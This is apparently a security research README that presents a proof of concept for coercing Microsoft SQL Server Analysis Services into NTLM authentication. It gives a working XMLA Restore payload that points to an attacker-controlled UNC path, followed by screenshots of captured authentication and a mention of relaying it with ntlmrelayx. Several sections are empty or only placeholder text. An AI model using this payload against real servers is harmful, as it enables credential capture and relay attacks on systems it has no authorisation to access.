# MSSQL Analysis Services - Coerced Authentication

A technique to coerce a Windows SQL Server to authenticate on an arbitrary machine.

This proof of concept is co-authored by <a href="https://twitter.com/intent/follow?screen_name=podalirius_" title="Follow"><img src="https://img.shields.io/twitter/follow/podalirius_?label=Podalirius&style=social"></a> and <a href="https://twitter.com/intent/follow?screen_name=_Worty" title="Follow"><img src="https://img.shields.io/twitter/follow/_Worty?label=Worty&style=social"></a>.

## Introduction



## Proof of concept

In order to trigger the authentification as the local machine account, we need to connect to the remote SQL Server using user credentials:

![](./.github/sql_analysis_connect.png)

Then we will select "Restore" to restore the database from a given file.

![](./.github/restore_db.png)

Then

![](./.github/accessed_xml_script.png)

Then

![](./.github/unc_path_in_xml_file.png)

Proof of concept ([poc.xmla](./poc.xmla)):

```xml
<Restore xmlns="http://schemas.microsoft.com/analysisservices/2003/engine">
    <File>\\192.168.2.51\SYSVOL\db.abf</File>
    <DatabaseName>\\192.168.2.51\SYSVOL\db.abf</DatabaseName>
    <DbStorageLocation xmlns="http://schemas.microsoft.com/analysisservices/2008/engine/100/100">\\192.168.2.51\SYSVOL\db.abf</DbStorageLocation>
</Restore>
```

And we get an authentication from the local machine account of the SQL Server:

![](./.github/responder_auth.png)

## Relaying for the win

![](./.github/responder_auth.png)

Once we got the authentification, we can relay it with `ntlmrelayx` to perform many actions on behalf of the computer `SQL01$`.

This is cool, but it is complicated to trigger this coerced authentication from a Linux attacking machine as we do not have access to the SQL Server Management Studio (SSMS). 

## References
 - https://docs.microsoft.com/en-us/sql/database-engine/install-windows/install-sql-server?view=sql-server-ver15
 - https://social.technet.microsoft.com/wiki/contents/articles/13106.sql-server-frequently-used-ports.aspx
 - https://docs.microsoft.com/en-us/answers/questions/274512/connecting-to-azure-analysis-services-using-python.html
